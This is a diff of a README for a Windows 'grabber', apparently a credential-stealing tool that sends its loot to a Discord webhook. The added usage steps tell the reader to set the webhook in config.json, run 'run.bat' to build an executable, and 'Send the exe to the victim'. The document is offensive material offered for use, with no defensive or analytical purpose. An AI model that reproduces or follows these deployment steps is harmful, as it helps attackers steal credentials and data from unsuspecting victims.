@@ -12,11 +12,16 @@ This version of the grabber only supports **Windows**.
 <br>
 
 # How to use
- 1. Create a webhook on your Discord server. I recommend creating a new server.
+ 1. Create a webhook on your Discord server.
  2. Change the 'webhook' value to your Discord webhook URL in config.json
+ 3. Make sure python is installed.
+ 4. Run "run.bat" and executable will be automatically generated.
+ 5. Send the exe to the victim.
+ 6. Viola!
 
 <br>
 
 # Author
 - **wodx**
+- Enhanced by quiet
 
